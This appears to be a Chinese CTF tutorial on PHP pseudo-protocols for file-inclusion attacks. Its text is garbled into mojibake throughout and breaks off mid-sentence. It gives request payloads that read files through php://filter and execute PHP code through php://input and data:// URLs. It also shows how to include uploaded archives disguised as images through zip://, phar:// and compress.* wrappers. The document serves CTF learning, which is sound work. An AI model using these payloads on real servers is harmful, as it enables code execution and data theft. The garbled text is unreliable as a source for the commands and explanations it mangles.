#ç”¨æ³•æ­£ç¡®ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„cmd=/flag #ç”¨æ³•æ­£ç¡®ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„cmd=flag #ç”¨æ³•æ­£ç¡®ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„ ç›¸å¯¹è·¯å¾„ å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„ç›®å½•ã€‚åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ã€‚ Windowsï¼šä¸ä»¥:indows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ Linux:ä¸ä»¥å¼€å¤´çš„è·¯å¾„ ä½¿ç”¨ç¤ºä¾‹ï¼šä»¥ä¼ å‚å˜é‡åä¸ºcmdæ¼”ç¤º #Linuxcmd=file:///path/to/flag #æ ¹ç›®å½•ä¸‹pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶ â€”â€”æ­¤å¤„æœ‰///ä¸‰æ¡cmd=/path/to/flag #æ ¹ç›®å½•ä¸‹pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=relative/path/flag #å½“å‰ç›®å½•ä¸‹relativeæ–‡ä»¶å¤¹ä¸­pathæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=flag #å½“å‰ç›®å½•ä¸‹çš„flagæ–‡ä»¶#Windowscmd=file://C:/path/to/flag #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=file://C:\\path\\to\\flag #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=C:\\path\\to\\flag #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=flag #å½“å‰æ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶ http: è®¿é—® HTTP(s) ç½‘å€ æ¡ä»¶ï¼š allow_url_fopen:on allow_url_include:on ä½œç”¨ï¼šå¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«ã€‚ ä½¿ç”¨ç¤ºä¾‹ï¼šä»¥ä¼ å‚å˜é‡åä¸ºcmdæ¼”ç¤º cmd=http://example.com/phpinfo.txt\t#è¯»å–http://example.com/phpinfo.txtæ–‡ä»¶cmd=https://example.com/file.php?var1=val1var2=val2\t#è¯»å–https://example.com/file.phpæ–‡ä»¶å¹¶ä¸”ä¼ å…¥var1å’Œvar2çš„å€¼ php: è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµ(IO streams)ï¼Œä¼ªåè®®æä¾›äº†å¤šç§ä¸åŒçš„æ–¹å¼æ¥è®¿é—®å’Œå¤„ç†æ•°æ® å¸¸è§çš„PHPä¼ªåè®®ï¼š php://input #è¿™ä¸ªä¼ªåè®®ç”¨äºè®¿é—®HTTPè¯·æ±‚çš„åŸå§‹ä¸»ä½“æ•°æ®ã€‚å®ƒé€šå¸¸ç”¨äºä»POSTè¯·æ±‚ä¸­è¯»å–æ•°æ®ã€‚php://output #è¿™ä¸ªä¼ªåè®®ç”¨äºè®¿é—®HTTPå“åº”çš„è¾“å‡ºæµã€‚å®ƒé€šå¸¸ç”¨äºå‘å®¢æˆ·ç«¯å‘é€æ•°æ®ã€‚php://stdin #ç”¨äºè®¿é—®æ ‡å‡†è¾“å…¥æµã€‚php://stdout #ç”¨äºè®¿é—®æ ‡å‡†è¾“å‡ºæµã€‚php://stderr #ç”¨äºè®¿é—®æ ‡å‡†é”™è¯¯è¾“å‡ºæµã€‚php://temp #ç”¨äºä¸´æ—¶å­˜å‚¨æ•°æ®çš„å†…å­˜æµã€‚å®ƒå¯ä»¥ç”¨äºåœ¨æ²¡æœ‰åˆ›å»ºå®é™…æ–‡ä»¶çš„æƒ…å†µä¸‹å¤„ç†ä¸´æ—¶æ•°æ®ã€‚php://memory #ç”¨äºåœ¨å†…å­˜ä¸­åˆ›å»ºå¯è¯»å†™çš„æ•°æ®æµã€‚php://filter #è¿™ä¸ªä¼ªåè®®ç”¨äºæ•°æ®è¿‡æ»¤å’Œè½¬æ¢ã€‚å®ƒå…è®¸æ‚¨å°†ä¸åŒçš„è¿‡æ»¤å™¨åº”ç”¨äºæ•°æ®æµï¼Œä¾‹å¦‚Base64ç¼–ç ã€å‹ç¼©å’ŒåŠ å¯†ç­‰ã€‚php://globals #ç”¨äºè®¿é—®å…¨å±€å˜é‡ã€‚å¯ä»¥é€šè¿‡æ­¤ä¼ªåè®®æŸ¥çœ‹å’Œä¿®æ”¹PHPå…¨å±€å˜é‡çš„å€¼ã€‚php://fd #ç”¨äºè®¿é—®æ–‡ä»¶æè¿°ç¬¦ã€‚å®ƒå…è®¸æ‚¨åœ¨PHPä¸­è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚ åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputã€php://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡ŒPOSTå‚æ•°ä¸­çš„phpä»£ç ã€‚ ä½œç”¨ï¼šphp: è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµ(IO streams) æ¡ä»¶ï¼š allow_url_fopen:offon allow_url_include :ä»…php://input ã€php://stdinã€php://memoryã€php://temp éœ€è¦on php:filteræ¡ä»¶ï¼š allow_url_fopen:offon allow_url_include :offon ä½œç”¨ï¼š php://filterå¯ä»¥ä½œä¸ºä¸€ä¸ªä½äºåŸå§‹æ•°æ®æµå’Œæœ€ç»ˆç›®æ ‡ä¹‹é—´çš„ä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œè´Ÿè´£å¯¹æ•°æ®è¿›è¡Œå¤„ç†ã€‚ï¼ˆå³è¯»å–æˆ–å†™å…¥æ•°æ®ä¹‹å‰å¯¹å…¶è¿›è¡Œä¿®æ”¹æˆ–è¿‡æ»¤ã€‚ï¼‰ åç§° æè¿° resourceè¦è¿‡æ»¤çš„æ•°æ®æµ è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ï¼ˆåŠ ç»å¯¹è·¯å¾„ï¼‰ readè¯»é“¾çš„ç­›é€‰åˆ—è¡¨ readå‚æ•°æŒ‡å®š ä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨ ç”¨äºè¯»æ“ä½œï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”ã€‚ï¼ˆè¯»å–æ–‡ä»¶åç¼–ç è¾“å‡ºï¼‰ writeå†™é“¾çš„ç­›é€‰åˆ—è¡¨ writeå‚æ•°æŒ‡å®š ä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨ ç”¨äºå†™æ“ä½œï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”ã€‚ï¼ˆç¼–ç é‡å†™å…¥æ–‡ä»¶ï¼‰ ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨ ä»»ä½•æ²¡æœ‰ä»¥ read æˆ– write ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ æ³¨ï¼š read å’Œ write æŒ‡ä»¤æ˜¯äº’æ–¥çš„ï¼Œä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚ å¦‚æœå­˜åœ¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œå­—ç¬¦ä¸²ä»å·¦åˆ°å³çš„é¡ºåºç»è¿‡è¿‡æ»¤å™¨ writeæŒ‡ä»¤ç”¨äºå†™å…¥æ–‡ä»¶ï¼Œå¯¹å­—ç¬¦ä¸²ç¼–ç åå†™å…¥ ?php/* å°† Hello World è¿›è¡Œbase64ç¼–ç ç„¶åå†™å…¥æ ¹ç›®å½•flag.txtæ–‡ä»¶ */file_put_contents(php://filter/write=convert.base64-encode/resource=/flag.txt,Hello World);? å¸¸ç”¨è¿‡æ»¤è¯­å¥ï¼š cmd=php://filter/read=convert.base64-encode/resource=/flag //è¯»å–æ ¹ç›®å½•flagæ–‡ä»¶ï¼Œè¿›è¡Œbase64ç¼–ç  å¸¸ç”¨è¿‡æ»¤å™¨ PHP ç‰ˆæœ¬ä¸­çš„è¿‡æ»¤å™¨ä¹Ÿè®¸æ¯”è¿™é‡Œåˆ—å‡ºçš„æ›´å¤šï¼ˆæˆ–æ›´å°‘ï¼‰ï¼Œå¯ç”¨ stream_get_filters()æ¥åˆ—å‡º PHP ä¸­å·²å®‰è£…çš„è¿‡æ»¤å™¨ã€‚ ä»¥dockerçš„PHP8.3.4ä¸ºä¾‹ï¼Œè‡ªå¸¦çš„è¿‡æ»¤å™¨æœ‰ zlib.* convert.iconv.* string.rot13 string.toupper string.tolower convert.* dechunk consumed (ç›®å‰ä¹Ÿä¸çŸ¥é“æ˜¯å•¥) å­—ç¬¦ä¸²è¿‡æ»¤å™¨ string.rot13ï¼ˆå¯¹å­—ç¬¦ä¸²æ‰§è¡ŒROT13ç¼–ç è½¬æ¢ï¼‰ string.toupperï¼ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™ï¼‰ string.tolowerï¼ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ï¼‰ string.strip_tags(è‡ª PHP 7.3.0 èµ·åºŸå¼ƒï¼Œä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°) å®˜æ–¹æ–‡æ¡£ï¼š PHP: å­—ç¬¦ä¸²è¿‡æ»¤å™¨ - Manual è½¬æ¢è¿‡æ»¤å™¨æ³¨ï¼šè½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ convert.base64-encodeå’Œ convert.base64-decodeï¼ˆå°†å­—ç¬¦ä¸²è¿›è¡Œbase64ç¼–ç åŠ è§£å¯†ï¼‰ convert.quoted-printable-encode å’Œ convert.quoted-printable-decodeï¼ˆå°†å­—ç¬¦ä¸²è¿›è¡ŒQuoted-printableç¼–ç åŠ è§£å¯†ï¼‰ Quoted-Printable ç¼–ç  - çŸ¥ä¹ (zhihu.com) convert.iconv.*ï¼ˆå°†å­—ç¬¦ä¸²è¿›è¡Œå­—ç¬¦ç¼–ç è½¬åŒ–ï¼‰ å®˜æ–¹æ–‡æ¡£ï¼š PHP: è½¬æ¢è¿‡æ»¤å™¨ - Manual å‹ç¼©è¿‡æ»¤å™¨ å‹ç¼©è¿‡æ»¤å™¨å¯ä»¥åœ¨ç½‘ç»œçš„æµä¸­æä¾›é€šç”¨å‹ç¼©ï¼Œå°†ä¸€ä¸ªéå‹ç¼©çš„æµè½¬æ¢æˆä¸€ä¸ªå‹ç¼©æµã€‚å¯ä»¥åœ¨ä»»ä½•æ—¶å€™åº”ç”¨äºä»»ä½•æµèµ„æºã€‚ å®˜æ–¹æ–‡æ¡£ï¼š PHP: å‹ç¼©è¿‡æ»¤å™¨ - Manual åŠ å¯†è¿‡æ»¤å™¨ï¼ˆå·²è‡ª PHP 7.1.0 èµ·åºŸå¼ƒï¼‰ åŠ å¯†è¿‡æ»¤å™¨ç‰¹åˆ«é€‚ç”¨äºæ–‡ä»¶æ•°æ®æµçš„åŠ å¯†ã€‚ å®˜æ–¹æ–‡æ¡£ï¼š PHP: åŠ å¯†è¿‡æ»¤å™¨ - Manual dechunk å°†HTTPåˆ†å—Chunkä¼ è¾“çš„æ•°æ®è¿›è¡Œè§£ç  HTTPåˆ†å—Chunkä¼ è¾“ï¼š å‘Šåˆ«ç­‰å¾…ï¼HTTPåˆ†å—Chunkä¼ è¾“è®©å®¢æˆ·ç«¯å“åº”æ›´è¿…é€Ÿæ•°æ®å³æ—¶å‘ˆç°-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com) æ³¨ï¼šæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯ï¼Œè¿›è¡Œè§£ç çš„æ•°æ®æµæ¯è¡Œéƒ½æœ‰åç¼€CRLFï¼ˆå³\\r ï¼‰ï¼Œå¦åˆ™å°†å¾—åˆ°ç©ºå­—ç¬¦ä¸² php:inputä¸»è¦ç”¨æ¥æ¥æ”¶postæ•°æ®ã€‚ æ¡ä»¶ï¼š allow_url_fopen:offon allow_url_include :on è¯´æ˜ï¼š CTFä¸­æ–‡ä»¶åŒ…å«é¢˜ç›®é‡Œï¼Œå¯ä»¥ä½¿ç”¨php://inputåè®®ï¼Œå°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºphpä»£ç æ‰§è¡Œã€‚ ä½¿ç”¨ç¤ºä¾‹ï¼šä»¥ä¼ å‚å˜é‡åä¸ºfileæ¼”ç¤º [URLéƒ¨åˆ†]?file=php://input[POST DATAéƒ¨åˆ†]?php phpinfo(); ? zlib: å‹ç¼©æµ æ¡ä»¶ allow_url_fopen:offon allow_url_include :offon ä½œç”¨ â€‹\tzip:// bzip2:// zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šjpgã€pngã€gifç­‰ç­‰ã€‚ æ³¨ï¼šzlib:// éœ€è¦æ˜¯æœåŠ¡å™¨å†…çš„å‹ç¼©åŒ…æ–‡ä»¶ã€ä½†ä¸å±€é™äºåç¼€å ç¤ºä¾‹ï¼š 1ã€ zip:[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] æ³¨æ„ï¼š#éœ€è¦URLç¼–ç ä¸º%23ï¼Œä¼ å…¥æ—¶ä¸è¦åŠ ä¸Š[ ] å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ï¼Œå¹¶ä¸Šä¼ ç›®å½•varwwwhtmlï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt 2ã€compress.bzip2:file.bz2å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ (åŒæ ·æ”¯æŒä»»æ„åç¼€å)ï¼Œå¹¶ä¸Šä¼ ç›®å½•varwwwhtmlï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=compress.bzip2:///var/www/html/phpinfo.bz2 3ã€compress.zlib:file.gzå‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ (åŒæ ·æ”¯æŒä»»æ„åç¼€å)ï¼Œå¹¶ä¸Šä¼ ç›®å½•varwwwhtmlï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=compress.zlib:///var/www/html/phpinfo.gz phar:phar:åè®®ä¸zip:ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ ä¾‹å¦‚,ä¸Šä¼ å‹ç¼©åŒ…åˆ°ç›®å½•varwwwhtmlï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt data:æ¡ä»¶ allow_url_fopen:on allow_url_include :on ä½œç”¨è‡ªPHP5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data:æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚ ç”¨æ³• data://text/plain,[åŠ ä¸Šæ‰€éœ€ä¼ è¾“çš„ç»è¿‡urlç¼–ç æ•°æ®] data://text/plain;base64,[åŠ ä¸Šæ‰€éœ€ä¼ è¾“çš„ç»è¿‡base64ç¼–ç å†ç»è¿‡urlç¼–ç çš„æ•°æ®] æ³¨æ„ï¼šä¼ å…¥æ—¶ä¸è¦åŠ ä¸Š[ ] ç¤ºä¾‹ï¼š data:textplain, http://127.0.0.1/include.php?file=data://text/plain,?php%20phpinfo();? data:textplain;base64, http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b ä½¿ç”¨åœºæ™¯å½“é‡åˆ°æ–‡ä»¶åŒ…å«å¯ä½¿ç”¨ä¼ªåè®®è¿›è¡Œ å¯èƒ½é‡åˆ°çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š includerequireinclude_oncerequire_oncehighlight_fileshow_sourcefliereadfilefile_get_contents file_put_contentsfopen includeå’Œrequireå‡½æ•°â€‹\té€šè¿‡ include æˆ– require è¯­å¥ï¼Œå¯ä»¥å°† PHP æ–‡ä»¶çš„å†…å®¹æ’å…¥å¦ä¸€ä¸ª PHP æ–‡ä»¶(åœ¨æœåŠ¡å™¨æ‰§è¡Œå®ƒä¹‹å‰)ã€‚ include å’Œ require è¯­å¥æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†é”™è¯¯å¤„ç†æ–¹é¢ï¼š require ä¼šç”Ÿæˆè‡´å‘½é”™è¯¯(E_COMPILE_ERROR)å¹¶åœæ­¢è„šæœ¬ã€include åªç”Ÿæˆè­¦å‘Š(E_WARNING)ï¼Œå¹¶ä¸”è„šæœ¬ä¼šç»§ç»­ è¯­æ³•ï¼š include filename;require filename; åŒºåˆ«ï¼š ?php include 23333.php;? ç”±äº23333.phpä¸å­˜åœ¨ä½¿ç”¨includeçš„æ—¶å€™ï¼Œåªä¼šåœ¨å½“å‰è¯­å¥æŠ¥é”™ï¼Œç„¶åæ‰§è¡Œåè¾¹çš„æ­£å¸¸è¯­å¥ ?php require 23333.php;? ä½†æ˜¯ä½¿ç”¨requireçš„æ—¶å€™ï¼Œå°±ä¼šç›´æ¥æŠ¥é”™ç„¶åè·³å‡ºå‡½æ•°ã€‚ include_onceå’Œrequire_onceå‡½æ•°â€‹\tinclude_once (require_once)è¯­å¥åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ include (require)è¯­å¥ç±»ä¼¼ï¼ŒåŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«äº†ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ï¼Œåªä¼šåŒ…å«ä¸€æ¬¡ã€‚include_once(require_once)éœ€è¦æŸ¥è¯¢ä¸€éå·²åŠ è½½çš„æ–‡ä»¶åˆ—è¡¨, ç¡®è®¤æ˜¯å¦å­˜åœ¨, ç„¶åå†åŠ è½½ã€‚ ?phprequire 1.php;require 1.php;? è¿™ç§æƒ…å†µä¸‹1.phpè¢«åŒ…å«ä¸¤æ¬¡ã€‚ ?phprequire 1.php;require_once 1.php;? è¿™ç§æƒ…å†µä¸‹ï¼Œç¬¬äºŒæ¬¡åŒ…å«æ—¶ï¼Œæ˜¯ä¸ä¼šè¿›è¡ŒåŒ…å«çš„ã€‚ highlight_file()å’Œshow_source()ä¸¤ä¸ªå‡½æ•°çš„ç”¨æ³•ç›¸åŒï¼Œå› ä¸ºshow_source()æ˜¯highlight_file()çš„åˆ«å show_source(filename,return);highlight_file(filename,return); å…¶ä¸­returnæ˜¯å¯é€‰é¡¹ å‚æ•° æè¿° filename å¿…éœ€ã€‚è¦è¿›è¡Œé«˜äº®å¤„ç†çš„ PHP æ–‡ä»¶çš„è·¯å¾„ã€‚ return å¯é€‰ã€‚å¦‚æœè®¾ç½® trueï¼Œåˆ™æœ¬å‡½æ•°è¿”å›é«˜äº®å¤„ç†çš„ä»£ç ï¼Œè€Œä¸æ˜¯è¾“å‡ºå®ƒä»¬ã€‚ â€‹\tâ€‹ readfileå’Œfile_get_contentså’Œfileä¸‰è€…åŒºåˆ«ï¼š åç§° ä½œç”¨ file æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ readfile è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚ file_get_contents å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² æ³¨ï¼šä»¥ä¸‹æåˆ°çš„**PHP çš„å†…ç½®è·¯å¾„ï¼ˆinclude_pathï¼‰**ä¸ºåœ¨php.iniçš„phpé…ç½®æ–‡ä»¶ä¸­è¿›è¡Œè®¾ç½®çš„æœç´¢è·¯å¾„ã€‚ file_get_contentsfile_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚ file_get_contents(path,include_path,context,start,max_length) å‚æ•° æè¿° path å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚ include_path å¯é€‰ã€‚åªæä¾›äº†æ–‡ä»¶åï¼Œè€Œæ²¡æœ‰æä¾›å®Œæ•´çš„æ–‡ä»¶è·¯å¾„ï¼Œå°†åœ¨PHP çš„å†…ç½®è·¯å¾„ï¼ˆinclude_pathï¼‰ä¸­æœç´¢æ–‡ä»¶ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_path(åœ¨ php.ini ä¸­)ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º â€˜1â€™ã€‚ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒï¼ˆå³æ‰§è¡Œçš„æ¡ä»¶ï¼‰ã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ NULLï¼Œåˆ™å¿½ç•¥ã€‚ start å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½®ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚ max_length å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚ readfilereadfile() å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚å¦‚æœå¤±è´¥ï¼Œè¯¥å‡½æ•°è¿”å› FALSE å¹¶é™„å¸¦é”™è¯¯ä¿¡æ¯ã€‚æ‚¨å¯ä»¥é€šè¿‡åœ¨å‡½æ•°åå‰é¢æ·»åŠ ä¸€ä¸ª â€˜@â€™ æ¥éšè—é”™è¯¯è¾“å‡ºã€‚ readfile(filename,include_path,context) å‚æ•° æè¿° filename å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚ include_path å¯é€‰ã€‚åªæä¾›äº†æ–‡ä»¶åï¼Œè€Œæ²¡æœ‰æä¾›å®Œæ•´çš„æ–‡ä»¶è·¯å¾„ï¼Œå°†åœ¨PHP çš„å†…ç½®è·¯å¾„ï¼ˆinclude_pathï¼‰ä¸­æœç´¢æ–‡ä»¶ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_path(åœ¨ php.ini ä¸­)ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º â€˜1â€™ã€‚ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒï¼ˆå³æ‰§è¡Œçš„æ¡ä»¶ï¼‰ã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚ fileä¸ file_get_contents() ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ file() å°†æ–‡ä»¶è¯»å–åä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒéƒ½æ˜¯æ–‡ä»¶ä¸­ç›¸åº”çš„ä¸€è¡Œï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…ã€‚ file(path,include_path,context) å‚æ•° æè¿° path å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ include_path å¯é€‰ã€‚åªæä¾›äº†æ–‡ä»¶åï¼Œè€Œæ²¡æœ‰æä¾›å®Œæ•´çš„æ–‡ä»¶è·¯å¾„ï¼Œå°†åœ¨PHP çš„å†…ç½®è·¯å¾„ï¼ˆinclude_pathï¼‰ä¸­æœç´¢æ–‡ä»¶ã€‚å¦‚æœä¹Ÿæƒ³åœ¨ include_path ä¸­æœå¯»æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥å°†è¯¥å‚æ•°è®¾ä¸º â€œ1â€ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒï¼ˆå³æ‰§è¡Œçš„æ¡ä»¶ï¼‰ã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥ã€‚ file_put_contentsfile_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) å‚æ•° åŠŸèƒ½ filename å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ data å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµ flag å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€å†™å…¥æ–‡ä»¶ã€‚å¯èƒ½çš„å€¼ï¼š FILE_USE_INCLUDE_PATH ï¼šåªæä¾›äº†æ–‡ä»¶åï¼Œè€Œæ²¡æœ‰æä¾›å®Œæ•´çš„æ–‡ä»¶è·¯å¾„ï¼Œå°†åœ¨PHP çš„å†…ç½®è·¯å¾„ï¼ˆinclude_pathï¼‰æœç´¢æ–‡ä»¶ã€‚FILE_APPENDï¼šå¦‚æœè®¾ç½®äº†è¯¥æ ‡å¿—ï¼Œæ•°æ®å°†è¢«è¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾è€Œä¸æ˜¯è¦†ç›–æ–‡ä»¶å†…å®¹ã€‚ LOCK_EXï¼šå¦‚æœè®¾ç½®äº†è¯¥æ ‡å¿—ï¼Œåœ¨å†™å…¥æ–‡ä»¶æ—¶ä¼šè·å–ä¸€ä¸ªç‹¬å é”å®šï¼ˆæ’å®ƒé”ï¼‰ï¼Œä»¥é˜²æ­¢å…¶ä»–è¿›ç¨‹åŒæ—¶å†™å…¥æ–‡ä»¶ã€‚è¿™å¯ä»¥ç¡®ä¿åœ¨å¤šä¸ªè¿›ç¨‹åŒæ—¶å†™å…¥æ–‡ä»¶æ—¶ä¸ä¼šå‘ç”Ÿå†²çªã€‚ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context 